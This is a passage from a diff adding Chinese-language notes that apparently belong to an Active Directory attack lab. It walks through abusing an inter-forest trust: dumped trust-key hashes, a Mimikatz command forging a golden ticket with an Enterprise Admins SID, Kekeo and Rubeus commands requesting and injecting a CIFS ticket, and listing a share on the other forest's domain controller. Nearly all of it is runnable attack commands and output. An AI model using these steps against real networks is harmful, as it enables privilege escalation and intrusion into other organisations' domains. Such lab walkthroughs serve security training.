+    * 1/29/2022 1:20:05 AM - CLEAR   - 1f 6f c4 25 57 c2 50 6e e2 8c b8 94 07 da 97 13 cc 89 5d 6d 0e 47 05 91 74 7c 3a c1
+        * aes256_hmac       91df6bcc4a71d585b710532ff73b662d43e4d83a00821f7d509319e4ce1897c5
+        * aes128_hmac       47f41fc169b79c34d8af08afa3cfdde9
+        * rc4_hmac_nt       cccb3ce736c4d39039b48c79f075a430
+```
+
+伪造一条到EUROCORP.LOCAL的TGT
+```
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:cccb3ce736c4d39039b48c79f075a430 /service:krbtgt /target:EUROCORP.LOCAL /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi"'
+```
+
+制作一张可以访问EUROCORP.LOCAL的TGS
+
+```
+.\asktgs.exe C:\AD\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local
+```
+
+将 TGS 呈现给目标服务
+```
+.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi
+```
+
+查看目标计算机里的SharedwithDCorp文件夹
+```
+ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
+```
+
+## 方法二（rebuse.exe）
+
+
+同样的，也可以使用Rubeus.exe，复用上面已经生成的TGT，生成TGS
+```
+.\Rubeus.exe asktgs /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
+```
+
+访问对方林中的计算机
+```
+ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
+```
